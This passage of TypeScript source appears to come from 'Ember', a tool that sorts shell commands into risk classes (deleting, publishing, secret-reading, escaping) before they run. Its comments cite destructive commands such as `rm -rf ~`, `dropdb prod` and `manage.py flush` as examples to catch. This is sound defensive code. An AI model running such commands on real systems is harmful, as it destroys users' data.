  return (words.some(w => /^(db|database)$/.test(w)) && words.some(w => DB_EMPTIES.has(w))) || words.some(w => /^(db|database)/.test(w) !== /(db|database)$/.test(w) && DB_EMPTIES.has(w.replace(JOINED_NAME, "")));
}
/**
 * The words handed to a package script after its name or after `--` (`npm run db -- drop`, `npm run migrate --
 * --reset`, `yarn db drop`: commands-classes-y9-9): a plain word or an option's name that says destroy asks as the
 * script's own name would. Only destroying words: `--prod` and `--watch` are everyday options of a build.
 */
function scriptGiven(h: H, script: string, words: readonly Arg[]): void {
  if (h.e.readsAsMain) return;
  for (const a of words) {
    const m = a.v === null ? null : /^(?:--?)?([A-Za-z][A-Za-z0-9]*(?:[:_-][A-Za-z0-9]+)*)(?:=.*)?$/.exec(a.v);
    if (!m || !namesDestroy(m[1])) continue;
    const display = `${script} ${m[1]}`;
    h.e.add("destroy", "script.destroy", `Runs ${display}, whose name says it deletes things.`, { objects: [{ kind: "other", text: display, abs: null }] });
    return;
  }
}
/** §3.5.9: a script, target or package-script name that says it publishes (b), deletes (a) or installs (e). */
function nameCheck(h: H, name: string, display = name): void {
  const words = nameWords(name);
  if (words.some(w => NAME_PUBLISH.has(w))) h.e.add("publish", "script.publish", `Runs ${display}, whose name says it publishes.`, { objects: [{ kind: "other", text: display, abs: null }] });
  if (namesDestroy(name)) h.e.add("destroy", "script.destroy", `Runs ${display}, whose name says it deletes things.`, { objects: [{ kind: "other", text: display, abs: null }] });
  if (words.some(w => NAME_SYSTEM.has(w))) h.e.add("system", "script.system", `Runs ${display}, whose name says it installs or sets up software.`, { objects: [{ kind: "other", text: display, abs: null }] });
}

/**
 * The verbs and targets handed to the project's own script wrapper (commands-remote-r9-4): `bin/rails db:drop`,
 * `./manage.py flush`, `python manage.py flush`, `php artisan migrate:fresh`, `./run.sh deploy`. Each plain word after
 * the script is judged by its name as a task runner's target is (nameCheck, the same word lists), said with the
 * script: "Runs ./manage.py flush, whose name says it deletes things." Never an option, a path or a file's name.
 */
function scriptVerbs(h: H, script: string, words: readonly Arg[]): void {
  if (h.e.readsAsMain) return;
  let migrates = false;
  for (const a of words) {
    const v = a.v;
    if (v === null || !/^[A-Za-z][A-Za-z0-9]*([:_-][A-Za-z0-9]+)*$/.test(v)) continue;
    nameCheck(h, v, `${script} ${v}`);
    // A migration taken back to nothing (`manage.py migrate app zero`) drops the app's tables (commands-classes-x9-8).
    if (migrates && v.toLowerCase() === "zero") h.e.add("destroy", "script.destroy", `Runs ${script} ${v}, whose name says it deletes things.`, { objects: [{ kind: "other", text: `${script} ${v}`, abs: null }] });
    migrates ||= nameWords(v).includes("migrate");
  }
}

/** A program run by its path (`./deploy.sh`, `scripts/release.ps1`): judged by its name's words. */
function scriptName(h: H, path: string): void {
  if (!path) return;
  nameCheck(h, path.replace(/^\.\//, ""), path);
}

/** Text programs: their arguments are words, not paths; only a secret variable printed matters. */
function textProgram(h: H): void {
  for (const a of h.args) {
    if (a.v === null) {
      const names = [...a.raw.replace(/'[^']*'/g, "").matchAll(/\$\{?([A-Za-z_][A-Za-z0-9_]*)/g)].map(m => m[1]);
      if (names.some(n => SECRET_VAR.test(n))) h.e.add("secret", "secret.env", SAYS.env);
    }
    const pct = a.raw.match(/%([A-Za-z_][A-Za-z0-9_]*)%/g) ?? [];
    if (pct.some(p => SECRET_VAR.test(p))) h.e.add("secret", "secret.env", SAYS.env);
  }
}

/** A global-option grammar walk (§3.4.8): the verb's index, the options before it, an unknown one. */
interface Globals { verbAt: number; opts: { name: string; value: string | null }[]; unknown: string | null }
function globals(h: H, prog: string, args: Arg[] = h.args): Globals {
  const g: GlobalGrammar | undefined = GLOBAL_OPTIONS[prog];
  const out: Globals = { verbAt: args.length, opts: [], unknown: null };
  // Whatever the options before the verb are, the command is broader than a plain one (§3.7).
  if (args.length && args[0].v !== null && args[0].v.startsWith("-") && args[0].v !== "-" && args[0].v !== "--") h.e.markGlobalOptions();
  for (let k = 0; k < args.length; k++) {
    const v = args[k].v;
    if (v === null) { out.verbAt = k; return out; }
    if (!v.startsWith("-") || v === "-" || v === "--") { out.verbAt = v === "--" ? k + 1 : k; return out; }
    if (!g) { out.opts.push({ name: v, value: null }); continue; }
    const eq = v.indexOf("=");
    const name = eq > 0 ? v.slice(0, eq) : v;
    if (g.flags.includes(v) || (eq > 0 && g.flags.includes(name))) { out.opts.push({ name, value: eq > 0 ? v.slice(eq + 1) : null }); continue; }
    if (g.withValue.includes(name)) {
      if (eq > 0) out.opts.push({ name, value: v.slice(eq + 1) });
      else if (name.length > 2 && !name.startsWith("--") && g.withValue.includes(name.slice(0, 2))) out.opts.push({ name: name.slice(0, 2), value: name.slice(2) });
      else { out.opts.push({ name, value: args[k + 1]?.v ?? null }); k++; }
      continue;
    }
    // An attached short value (-Cdir, -c key=value written together).
    const short = v.slice(0, 2);
    if (!v.startsWith("--") && v.length > 2 && g.withValue.includes(short)) { out.opts.push({ name: short, value: v.slice(2) }); continue; }
    out.unknown = v;
    out.verbAt = k;
    return out;
  }
  return out;
}

/** An unknown option before a verb is unclear (§3.4.8); a host-pointing one is class b. */
function checkGlobals(h: H, prog: string, g: Globals): void {
  if (g.unknown) h.e.unclear("unclear.global-option", "Ember can't tell which command this runs.");
  const host = GLOBAL_OPTIONS[prog]?.hostPointing ?? [];
  for (const o of g.opts) {
    if (!host.includes(o.name)) continue;
    const v = o.value ?? "";
    if ((o.name === "-c" || o.name === "--context") && (v === "default" || v === "desktop-linux")) continue;
    if ((o.name === "-H" || o.name === "--host") && /^(unix|npipe):\/\//.test(v)) continue;
    if (o.name === "--remote" || o.name === "-r") { h.e.add("publish", `${prog}.remote-host`, `Sends commands to another computer's ${prog}.`); continue; }
    h.e.add("publish", `${prog}.remote-host`, `Sends commands to another computer (${v || "?"}).`, { objects: [{ kind: "host", text: v, abs: null }] });
  }
}

/** The first operand after options (a verb), skipping flags only. */
function firstOperand(args: Arg[]): { at: number; v: string | null } {
  for (let k = 0; k < args.length; k++) {
    const v = args[k].v;
    if (v === null) return { at: k, v: null };
    if (v === "--") return { at: k + 1, v: args[k + 1]?.v ?? null };
    if (!v.startsWith("-")) return { at: k, v };
  }
  return { at: args.length, v: null };
}

/** The interactive-program rule (§3.5.7), with the arguments that make each one finish. */
function interactive(h: H): void {
  const a = h.args;
  const p = opts(h);
  const ops = p.operands.map(x => x.v);
  const stdin = h.s.stdin !== null;
  const add = (): void => h.e.unclear("unclear.interactive", SAYS.interactive);
  switch (h.key) {
    case "top": if (!has(p, "b", "batch") && !(h.sc.os === "darwin" && has(p, "l"))) add(); return;
    case "tmux": {
      const sub = ops[0];
      const subs = sub === undefined || sub === null ? [] : tmuxVerbs(sub);
      if (sub === undefined || sub === null || subs.some(n => ["attach", "a", "at", "attach-session", "new", "new-session"].includes(n))) {
        if (a.some(x => x.v === "-d" || (x.v !== null && /^-[A-Za-z]*d/.test(x.v) && !x.v.startsWith("--")))) h.e.add("escape", "escape.tmux", SAYS.keepsRunning);
        else add();
      } else if (subs.some(n => ["kill-server", "kill-session", "kill-pane", "kill-window", "killp", "killw"].includes(n))) h.e.add("system", "kill.process", "Stops programs that are running (tmux sessions).");
      return;
    }
    case "screen":
      if (a.some(x => x.v !== null && /^-[A-Za-z]*d[A-Za-z]*m|^-dm/.test(x.v))) { h.e.add("escape", "escape.screen", SAYS.keepsRunning); return; }
      if (a.some(x => x.v === "-ls" || x.v === "-list" || x.v === "-Q" || x.v === "-v" || x.v === "--version")) return;
      add();
      return;
    case "psql": if (!(has(p, "c", "command", "f", "file", "l", "list", "version", "V") || stdin)) add(); return;
    case "mysql": case "mariadb": if (!(has(p, "e", "execute", "V", "version") || stdin)) add(); return;
    case "sqlite3": if (!(ops.length >= 2 || stdin || has(p, "version", "cmd"))) add(); return;
    case "mongo": case "mongosh": if (!(has(p, "eval", "version") || ops.some(o => o?.endsWith(".js")) || stdin)) add(); return;
    case "redis-cli": if (!(ops.length >= 1 || stdin || has(p, "version", "v"))) add(); return;
    case "bc": case "dc": if (!(ops.length >= 1 || stdin || has(p, "version", "v"))) add(); return;
    case "ed": case "ex": {
      // Script fed on stdin or a here-document: a `!` line, or `r !`/`w !`, runs a shell command (review #166).
      if (!stdin) { add(); return; }
      const edited = parseOpts(a, { shortValue: "p" }).operands;
      fromStdin(h, t => {
        if (/!/.test(t)) h.e.unclear("unclear.ed-shell", "It can run a shell command from the editor.");
        // The files its commands name (`r FILE`, `e FILE`, `w FILE`) are read or written, by §3.6's rules (review #166).
        const named = edFiles(t, edited.length > 0);
        for (const f of named.read) h.e.usePath(lit(f), "read", h.sc);
        for (const f of named.write) h.e.usePath(lit(f), "write", h.sc);
      });
      // The file the script edits: written (a `w` saves it), so §3.6's rules meet it (review #169).
      for (const f of edited) h.e.usePath(f, "write", h.sc);
      return;
    }
    case "gdb": case "lldb": if (!has(p, "batch", "x", "version", "v")) add(); return;
    case "emacs": if (!has(p, "batch", "version", "script")) add(); else if (has(p, "eval")) h.e.unclear("unclear.inline-code", "It runs code given on the command line."); return;
    case "watch": {
      add();
      // watch hands its words, joined, to sh -c.
      // -d (--differences) takes a value only attached or after = (commands-remote-i5a).
      // Main's table gave -d and --differences the next word and knew no --equexit: judged that way too (commands-held-8).
      const w = heldOpts(h, { shortValue: "nq", shortOptional: "d", longValue: ["interval", "equexit"], longOptional: ["differences"], stopAtOperand: true }, { shortValue: "nqd", longValue: ["interval", "differences"], stopAtOperand: true }, a);
      if (w.operands.some(x => x.v === null)) h.e.unclear("unclear.shell-text", "It runs shell text Ember can't see.");
      else if (w.operands.length) h.e.nested(w.operands.map(x => x.v).join(" "), "sh", h.sc, "watch");
      return;
    }
    case "crontab": return;
    case "passwd": add(); return;
    default: add();
  }
}

/**
 * The files an ed or ex script reads and writes (review #166): `e`/`r FILE` read it, `w FILE` (and ex's `wq`, `x`,
 * `sav`) write it, and a bare `w` writes the remembered name, which `e`, `f`, and a first `r` or `w` set when the
 * command line named no file. Text added with `a`, `i` or `c` up to a `.` line is not commands. A name starting with
 * `!` is a shell command (asked for already).
 */
function edFiles(text: string, fileGiven: boolean): { read: string[]; write: string[] } {
  const read: string[] = [];
  const write: string[] = [];
  let remembered: string | null = null;
  let adding = false;
  for (const line of text.split("\n")) {
    if (adding) { if (line === ".") adding = false; continue; }
    const m = /^[\s:]*(?:[\d.$,;%+\s-]|'[a-z]|\/(?:\\.|[^/\\])*\/|\?(?:\\.|[^?\\])*\?)*([A-Za-z]+)!?\s*(?:>>\s*)?(.*)$/.exec(line);
    if (!m) continue;
    const [, cmd, rest] = m;
    const name = rest.trim() !== "" && !rest.trim().startsWith("!") ? rest.trim() : null;
    if (/^(a|i|c|append|insert|change)$/.test(cmd)) { adding = true; continue; }
    if (/^(e|E|ed|edi|edit|r|re|rea|read)$/.test(cmd) && name !== null) {
      read.push(name);
      if (!/^r/.test(cmd) || (remembered === null && !fileGiven)) remembered = name;
    } else if (/^(f|fi|fil|file)$/.test(cmd) && name !== null) remembered = name;
    else if (/^(w|W|wq|x|xi|xit|exi|exit|wr|wri|writ|write|sav|save|savea|saveas|up|upd|upda|updat|update)$/.test(cmd)) {
      if (name !== null) { write.push(name); if (remembered === null && !fileGiven) remembered = name; }
      else if (remembered !== null) write.push(remembered);
    }
  }
  return { read, write };
}

/** Launchers that hand work to the desktop or a daemon (§3.4.7, critique wsl-6): class f. */
function launcher(h: H): void {
  const p = opts(h, { shortValue: "abe", longValue: ["new-window", "reuse-window", "goto", "diff", "add", "user-data-dir", "extensions-dir", "profile"] });
  if (["code", "code-insiders", "cursor", "codium", "vscodium", "windsurf"].includes(h.key)) {
    if (has(p, "version", "v", "help", "h", "list-extensions", "status")) return;
    if (has(p, "install-extension", "uninstall-extension")) { h.e.add("system", "pkg.language", "Installs packages (they can run their own setup code)."); return; }
  }
  let downloaded = false;
  for (const a of p.operands) {
    if (a.v !== null && /^ember:/i.test(a.v)) h.e.refuseWith("ember.url", "input");
    if (h.e.isDownloaded(a, h.sc)) downloaded = true;
  }
  for (const o of p.opts) if (o.value && /^ember:/i.test(o.value)) h.e.refuseWith("ember.url", "input");
  h.e.readArgs(p.operands.filter(a => a.v === null || !URL_LIKE.test(a.v)), h.sc);
  if (downloaded) h.e.add("escape", "escape.run-downloaded", SAYS.runsDownloaded);
  h.e.add("escape", "escape.launcher", SAYS.opensProgram);
}

/** File names that say plain data, which no program runs: tables, text, pictures, sound, documents (namesDownload). */
const DATA_FILE = /\.(csv|tsv|txt|text|log|md|markdown|rst|json|jsonl|ndjson|geojson|png|jpe?g|gif|bmp|webp|tiff?|ico|heic|pdf|mp3|mp4|m4a|wav|flac|ogg|mov|mkv|avi|webm|ttf|otf|woff2?|parquet|npy|npz|xlsx?|docx?|pptx?|odt|ods|epub)$/i;
/** Programs that run their arguments as a command: they are wrappers Ember doesn't know (an unknown program's operand). */
const KNOWN_ORDINARY = new Set([
  "wslpath", "wslinfo",
  "cat", "ls", "ll", "dir", "vdir", "grep", "egrep", "fgrep", "rg", "ag", "ack", "head", "tail", "wc", "sort", "uniq", "cut", "tr", "diff",
  "cmp", "comm", "file", "stat", "du", "df", "tree", "jq", "yq", "xmllint", "md5sum", "sha1sum", "sha224sum", "sha256sum", "sha384sum",
  "sha512sum", "b2sum", "cksum", "sum", "od", "hexdump", "xxd", "strings", "column", "paste", "join", "nl", "fold", "fmt", "split", "csplit",
  "rev", "tac", "base64", "base32", "iconv", "dos2unix", "unix2dos", "realpath", "readlink", "ps", "pgrep", "pidof", "lsof", "ss",
  "netstat", "ping", "ping6", "traceroute", "tracepath", "dig", "nslookup", "host", "whois", "cmake", "gcc", "g++", "cc", "c++", "clang",
  "clang++", "ld", "as", "ar", "nm", "objdump", "readelf", "ldd", "strip", "javac", "java", "kotlinc", "tsc", "eslint", "prettier", "black",
  "ruff", "flake8", "pylint", "mypy", "pytest", "jest", "vitest", "mocha", "rustc", "ninja", "meson", "bazel", "scons", "ctest",
  "lsb_release", "journalctl", "dmesg", "lscpu", "lsblk", "lspci", "lsusb", "free", "vmstat", "iostat", "mpstat", "nvidia-smi",
  "sensors", "groups", "getent", "last", "lastlog", "finger", "units", "convert", "magick", "identify", "ffprobe", "pandoc", "look",
  "locate", "mlocate", "plocate", "whatis", "apropos", "zcat", "zless", "zgrep", "bzcat", "xzcat", "lzcat", "expand", "unexpand",
  "shuf", "tsort", "ptx", "pr", "tabs", "envsubst", "gettext", "ngettext", "msgfmt", "xgettext", "test", "true", "false", "pwd",
  "basename", "dirname", "mktemp", "seq", "printf", "echo", "date", "sleep", "uname", "hostname", "whoami", "id", "uptime", "nproc",
  "arch", "tty", "stty", "tput", "clear", "env", "printenv", "cal", "factor", "numfmt", "yes", "getconf", "locale", "which", "whereis",
  "type", "findstr", "where", "fc", "comp", "more", "ipconfig", "systeminfo", "tasklist", "tracert", "pathping", "getmac", "whoami",
  "quser", "qwinsta", "query", "gpresult", "driverquery", "ver", "vol", "chcp", "doctl", "node", "deno", "python", "python3", "ruby",
  "perl", "php", "go", "cargo", "npm", "pnpm", "yarn", "make", "gradle", "mvn", "dotnet", "git", "gh", "docker", "kubectl", "helm",
  "terraform", "aws", "az", "gcloud",
]);

/**
 * Programs with a handler whose names are common words or tools no wrapper runs: as an unknown program's operand
 * (`mise trust`, `somecli trust list`) they are words, as they were before these handlers existed.
 */
const NOT_RUNNERS = new Set([
  "trust", "plutil", "plistbuddy", "systemsetup", "update-ca-trust", "update-ca-certificates", "bazelisk", "sponge", "unrar", "dpkg-deb",
  "desktop-file-install", "desktop-file-edit", "update-desktop-database", "busybox", "caddy", "miniserve", "cloudflared", "ngrok", "tailscale",
  "ssh-copy-id", "mount_smbfs", "mount_afp", "mount_webdav", "del", "scrub",
]);
/** Program keys that, as an unknown program's operand, suggest it runs them (a wrapper Ember doesn't know). */
let RUNNERS: ReadonlySet<string> | null = null;
function runners(): ReadonlySet<string> {
  if (!RUNNERS) {
    const s = new Set<string>(Object.keys(NATIVE).filter(k => !KNOWN_ORDINARY.has(k) && !TEXT.has(k) && !NOT_RUNNERS.has(k)));
    for (const k of ["git", "docker", "kubectl", "npm", "curl", "wget", "python", "python3", "node", "perl", "ruby"]) s.add(k);
    RUNNERS = s;
  }
  return RUNNERS;
}

/**
 * An unknown program: its operands read as paths; an operand naming a program may mean it runs it. With `noRow` (a
 * program with no row at all, not a row's own fallback such as busybox's or sponge's), a broad folder asks too.
 */
function generic(h: H, noRow = false): void {
  const k = h.key;
  if (INPUT_SYNTH.has(k)) { h.e.refuseWith("ember.input", "input"); return; }
  if (ENV_LAUNCHERS.has(k) && !h.e.readsAsMain) launcherSets(h);
  if (GUI_PROGRAMS.has(k)) h.e.unclear("unclear.gui", SAYS.openApp);
  if (INTERACTIVE.has(k)) interactive(h);
  if (LAUNCHERS.has(k)) { launcher(h); return; }
  if (SECRET_PROGRAMS.has(k)) h.e.add("secret", "secret.program", SAYS.secrets);
  if (CLIPBOARD_READERS.has(k)) h.e.add("secret", "secret.clipboard", SAYS.clipboard);
  if (SCREENSHOTTERS.has(k)) h.e.add("secret", "secret.screen", SAYS.screen);
  if (RECORDERS.has(k)) h.e.add("secret", "secret.record", SAYS.records);
  // sox's `-d` as its input is the microphone; GStreamer's capture sources are the microphone and the camera.
  if ((k === "sox" && h.args.some((a, i) => a.v === "-d" && i < h.args.length - 1)) || (/^gst-launch/.test(k) && h.args.some(a => /^(pulsesrc|alsasrc|pipewiresrc|autoaudiosrc|osxaudiosrc|wasapisrc|v4l2src|autovideosrc|avfvideosrc|ksvideosrc|libcamerasrc)$/.test(a.v ?? "")))) {
    h.e.add("secret", "secret.record", SAYS.records);
  }
  if (DISK_TOOLS.has(k) || /^mkfs(\.|$)/.test(k)) h.e.add("destroy", "disk.erase", "Erases or repartitions a disk.");
  h.e.readArgs(h.args, h.sc, { unresolvedUnclear: !TEXT.has(k) });
  if (KNOWN_ORDINARY.has(k) || GUI_PROGRAMS.has(k) || INTERACTIVE.has(k) || SECRET_PROGRAMS.has(k)) return;
  if (noRow) broadOperand(h);
  const at = h.args.findIndex(a => {
    const base = (a.v ?? "").split(/[\\/]/).pop() ?? "";
    return a.v !== null && /^[A-Za-z]/.test(base) && runners().has(base.toLowerCase().replace(/\.(exe|com)$/, ""));
  });
  if (at >= 0) {
    h.e.unclear("unclear.hidden-command", `Ember can't tell how ${h.prog} runs ${h.args[at].v}.`);
    h.e.payload(h.args.slice(at), h.sc, h.prog);
  }
  // Never a program Ember knows by name, whose -c, -e, -s and -x are its own options (`shellcheck -x`, `fd -X`).
  if (noRow && !knownProgram(k) && !ORDINARY_VERBS[k] && !ORDINARY_VERBS[unversioned(k)]) handedCommand(h, at);
}

/** Options whose value is a command the tool runs, by the names tools give them (`--exec`, `--command`, `-x`, `-c`). */
const EXEC_OPTION = /^(--exec|--exec-batch|--command|--cmd|--run|--shell-cmd|--shell-command|-x|-X|-c|-s|-e)$/;
/** A first word after which the rest is a command to run (`mytool exec x`, `mytool run -- x`). */
const EXEC_WORDS = new Set(["exec", "run", "x", "do", "sh", "shell", "spawn", "watch", "with", "wrap"]);

/**
 * A command handed to a program with no row (commands-remote-r9-2): as one quoted word (`mytool 'rm -rf build'`), as
 * the value of an exec-like option (`--exec 'npm publish'`, `-x make`), or as the words after `--` or an exec-like
 * first word (`mytool -- ./a.sh`, `mytool exec dropdb prod`). It is read as a command of its own, so the whole
 * decides at least as strictly as that command would alone. A quoted word counts when its first word names a program
 * Ember has a row for; an exec-like option's value with a space in it always does. Behind a program Ember doesn't
 * know it also asks how the one runs the other (`unclear.hidden-command`), which the user's words naming the program
 * never announce; the project's own script (a path in the task's folder) is judged by the handed command alone.
 * `runnerAt`: where generic() already found a runner's name among the words, and read on from there.
 */
function handedCommand(h: H, runnerAt: number, script?: { name: string; args: Arg[] }): void {
  if (script && h.e.readsAsMain) return;
  const args = script ? script.args : h.args;
  const prog = script ? script.name : h.prog;
  const unknown = script
    ? !ownFolder(script.name, h.sc, h.e.ctx.cwd || null)
    : !(h.pn.isPath && h.nameArg.v !== null && ownFolder(h.nameArg.v, h.sc, h.e.ctx.cwd || null));
  const shell: ShellId = h.sc.family === "powershell" ? "powershell" : h.sc.family === "cmd" ? "cmd" : "sh";
  const names = (word: string): boolean => {
    const base = (word.split(/[\\/]/).pop() ?? "").toLowerCase().replace(/\.(exe|com)$/, "");
    if (!/^[a-z]/.test(base)) return false;
    if (runners().has(base) || NATIVE[base] !== undefined) return true;
    if (h.sc.family === "powershell") return CMDLETS[base] !== undefined || PS_ALIASES[base] !== undefined;
    return h.sc.family === "cmd" && CMD_BUILTINS[base] !== undefined;
  };
  const hidden = (what: string): void => { if (unknown) h.e.unclear("unclear.hidden-command", `Ember can't tell how ${prog} runs ${what}.`); };
  const text = (t: string, option: boolean): void => {
    const first = t.trim().split(/\s+/)[0] ?? "";
    if (first === "" || !(names(first) || (option && /\s/.test(t.trim())))) return;
    hidden(first);
    h.e.nested(t, shell, h.sc, prog);
  };
  for (let k = 0; k < args.length; k++) {
    const v = args[k].v;
    if (v === null || k === runnerAt) continue;
    const eq = v.startsWith("-") ? v.indexOf("=") : -1;
    if (EXEC_OPTION.test(eq < 0 ? v : v.slice(0, eq))) {
      const value = eq < 0 ? args[k + 1]?.v : v.slice(eq + 1);
      if (eq < 0) k++;
      if (value !== null && value !== undefined) text(value, true);
      continue;
    }
    if (!v.startsWith("-") && /\s/.test(v.trim())) text(v, false);
  }
  // The words after `--`, or after an exec-like first word and its own `--`.
  const first = firstOperand(args);
  let at = args.findIndex(a => a.v === "--");
  if (at < 0 && first.v !== null && EXEC_WORDS.has(first.v)) at = first.at;
  if (at < 0 || at + 1 >= args.length || (runnerAt >= 0 && runnerAt <= at + 1 + (args[at + 1].v === "--" ? 1 : 0))) return;
  const rest = args.slice(args[at + 1].v === "--" ? at + 2 : at + 1);
  const next = rest[0];
  if (!next || next.v === null || next.v.startsWith("-")) return;
  if (unknown ? args[at].v === "--" || /[\\/]/.test(next.v) : names(next.v) || h.e.isDownloaded(next, h.sc)) {
    hidden(next.v);
    h.e.payload(rest, h.sc, prog);
  }
}

/**
 * The same reading for a script a shell or an interpreter runs (`bash ./run.sh 'rm -rf ~'`, `python3 tool.py --exec
 * 'npm publish'`, `node tool.js -- git push --force`: commands-classes-x9-4), from runScript: the words after the
 * script are the script's own, so a command among them decides as it does when the script is started by its path.
 */
function handedToScript(h: H, script: Arg): void {
  const at = h.args.indexOf(script);
  if (script.v === null || at < 0) return;
  handedCommand(h, -1, { name: script.v, args: h.args.slice(at + 1) });
  moduleProgram(h, script.v, h.args.slice(at + 1));
}

/** A path into the project's installed packages. */
const IN_NODE_MODULES = /(^|[\\/])node_modules[\\/]/;
/**
 * A file of an installed package handed to an interpreter (`node node_modules/.bin/cross-env …`, `node
 * node_modules/cross-env/src/bin/cross-env.js …`: integ2-z-3): where its name in `.bin`, its own name or its package's
 * is a launcher or a program Ember has a row for, the words after it are judged as that program's line, so it decides
 * no less safely than the program by its name.
 */
function moduleProgram(h: H, path: string, rest: Arg[]): void {
  if (h.e.readsAsMain || !IN_NODE_MODULES.test(path)) return;
  const parts = path.split(/[\\/]/);
  const from = parts.lastIndexOf("node_modules");
  const strip = (w: string | undefined): string => (w ?? "").toLowerCase().replace(/\.(cmd|ps1|exe|bat|[cm]?js)$/, "");
  const pkg = parts[from + 1]?.startsWith("@") ? parts[from + 2] : parts[from + 1];
  const names = [...new Set([strip(parts[parts.length - 1]), pkg === ".bin" ? "" : strip(pkg)])].filter(n => n !== "");
  const name = names.find(n => ENV_LAUNCHERS.has(n)) ?? names.find(n => NATIVE[n] !== undefined || ORDINARY_VERBS[n] !== undefined);
  if (name !== undefined && name !== h.key) h.e.payload([lit(name), ...rest], h.sc, h.prog);
}

/**
 * Names a project gives its own scripts that a program also has (`yarn format`, `yarn watch`, `npm start`): behind a
 * package manager they are the project's script, whose words are read as a script's (runnerLine).
 */
const SCRIPT_WORDS = new Set([
  "test", "start", "stop", "restart", "build", "dev", "lint", "format", "fmt", "watch", "serve", "bundle", "clean", "check", "docs", "preview", "export", "typecheck",
  "coverage", "verify",
]);

/** Everyday verbs of the project's own tools that a program is also named (`yarn expo start`, `yarn husky install`). */
const TOOL_VERBS = new Set(["install", "open", "link", "exec"]);

/**
 * What a package manager hands to the script or program it runs by name (`yarn cross-env …`, `pnpm run x …`, `npm run
 * build -- …`, `npm test -- …`: integ2-z-1). A name that is a launcher or a program Ember has a row for (a shell, an
 * interpreter, `npm`, `git`, `rm`) is judged as that program's own line, so nothing decides less safely with the
 * package manager in front; pnpm and bun run any program on the PATH this way, and Yarn has `yarn node`. Any other
 * name is the project's own script or binary, as `./node_modules/.bin/<name>` is: it never asks as a program Ember
 * doesn't know, and its words are read as that program's are (a secret's path, Ember's own, a word Ember can't see,
 * a program among them, a command handed in quotes or after an exec-like option, a variable that names code, a first
 * word that says it publishes); a word
 * that is a script's everyday name or a tool's everyday verb (`start`, `watch`, `install`) is no program there. The
 * manager drops one `--` after the name.
 */
function runnerLine(h: H, name: Arg, given: readonly Arg[], wrapper: string): void {
  if (h.e.readsAsMain || name.v === null) return;
  const rest = given[0]?.v === "--" ? given.slice(1) : [...given];
  const key = programName(name.v, { os: h.sc.os, family: h.sc.family === "cmd" ? "posix" : h.sc.family, wsl: h.sc.wsl, mountRoot: h.sc.mountRoot }).key;
  const program = ENV_LAUNCHERS.has(key) || (!SCRIPT_WORDS.has(key) && (NATIVE[key] !== undefined || NATIVE[unversioned(key)] !== undefined));
  // A deleter with nothing after its name is the project's script of that name (commands-remote-x8-13); a `--`
  // after it was always read as something handed to it (commands-runners-3).
  if (program && !(NEW_DELETERS.has(key) && given.length === 0)) { h.e.payload([name, ...rest], h.sc, wrapper); return; }
  h.e.readArgs(rest, h.sc, { unresolvedUnclear: true });
  // The tool's own verb, where its name says it publishes (`yarn lerna publish`, `pnpm vercel deploy`), as a script's
  // name is read. Only the first word, and never a script's everyday name's: `--mode production` and `yarn build
  // production` are a build's everyday target (commands-runners-4).
  const verb = SCRIPT_WORDS.has(key) ? "" : rest[0]?.v ?? "";
  if (/^[A-Za-z][A-Za-z0-9]*([:_-][A-Za-z0-9]+)*$/.test(verb) && nameWords(verb).some(w => NAME_PUBLISH.has(w))) {
    h.e.add("publish", "script.publish", `Runs ${wrapper} ${verb}, whose name says it publishes.`, { objects: [{ kind: "other", text: `${wrapper} ${verb}`, abs: null }] });
  }
  for (const a of rest) {
    const m = SETS_VARIABLE.exec(a.v ?? a.raw);
    if (m && riskyAssignment(m[1], a.v === null ? null : m[2])) { h.e.unclear("unclear.assignment", "It changes how commands are found or run."); break; }
  }
  const at = rest.findIndex(a => {
    const base = (a.v ?? "").split(/[\\/]/).pop() ?? "";
    const word = base.toLowerCase().replace(/\.(exe|com)$/, "");
    return a.v !== null && /^[A-Za-z]/.test(base) && runners().has(word) && !SCRIPT_WORDS.has(word) && !TOOL_VERBS.has(word);
  });
  if (at >= 0) {
    h.e.unclear("unclear.hidden-command", `Ember can't tell how ${wrapper} runs ${rest[at].v}.`);
    h.e.payload(rest.slice(at), h.sc, wrapper);
  }
  handedCommand(h, at, { name: name.v, args: rest });
  // Its `-o` and a path attached to a one-letter option, as an unknown program's (the long options are the line's own).
  optionPaths({ ...h, key, args: rest }, true);
}

/**
 * The closed default (commands-closed, the integrator's decision of round nine, recorded for the owner): a program
 * Ember has no row for and that isn't on ORDINARY_PROGRAMS asks, class "unknown", rule `unknown.program`, whatever
 * its operands. A program given by a path in the command's own folder (the project's scripts and binaries: `./build.sh`,
 * `bin/tool`, `node_modules/.bin/x`) is judged as before (a download in the task still asks); one given by a path
 * elsewhere (`/usr/local/bin/x`, `~/bin/x`) is known by its name as a bare name is. The user's own words naming the
 * program announce it (intent.ts). generic() still judges its operands.
 */
function unknownProgram(h: H): void {
  // Main's reading of a held row (runRow) ran what it took for the program, as every program with no row ran there.
  if (h.e.readsAsMain || h.nameArg.v === null) return;
  // The project's own copy of a launcher is the launcher (integ2-z-3).
  if (h.pn.isPath && ownFolder(h.nameArg.v, h.sc, h.e.ctx.cwd || null) && !(ENV_LAUNCHERS.has(h.key) && IN_NODE_MODULES.test(h.nameArg.v))) return;
  const tool = ORDINARY_VERBS[h.key] ?? ORDINARY_VERBS[unversioned(h.key)];
  if (tool) { toolVerbs(h, tool, true); return; }
  // On Windows `convert` is the system's own FAT-to-NTFS converter; ImageMagick is `magick` there (commands-closed-y9-4).
  if (knownProgram(h.key) && !(h.key === "convert" && h.sc.os === "win32")) {
    // A TeX engine's shell escape runs the commands the document names (`\write18`).
    if (TEX_ENGINES.has(h.key) && h.args.some(a => a.v === null || /^--?(shell-escape|enable-write18)$/.test(a.v))) {
      const escape = h.args.find(a => a.v === null || /escape|write18/.test(a.v))?.v ?? "";
      h.e.add("unknown", "unknown.verb", unknownVerbSays(h.prog, escape), { program: `${h.prog} ${escape}`.trim() });
    }
    return;
  }
  // A cmd name that is a batch file in the folder (`build` for build.bat) is the project's own, read as a script.
  if (h.sc.family === "cmd" && !h.pn.isPath && h.pn.ext === "" && [".bat", ".cmd"].some(e => h.e.onRecord(lit(h.nameArg.v + e), h.sc))) return;
  h.e.add("unknown", "unknown.program", SAYS.unknownProgram, { program: withOperandVerb(h) });
}

/**
 * An unknown program named with the words that say what it is to do (commands-closed-x9-1): every operand that is a
 * plain word (`rails db:drop`, `supabase db reset`, `dropdb prod`, and `production` in `dropdb -p 5433 production`:
 * commands-closed-y9-3), never an option, a path, a number or a file name. The user's words must name them too for it
 * to be announced, and the announcement says them.
 */
function withOperandVerb(h: H): string {
  const words: string[] = [];
  for (const a of h.args) if (a.v !== null && /^[A-Za-z][A-Za-z0-9_:-]*$/.test(a.v)) words.push(a.v);
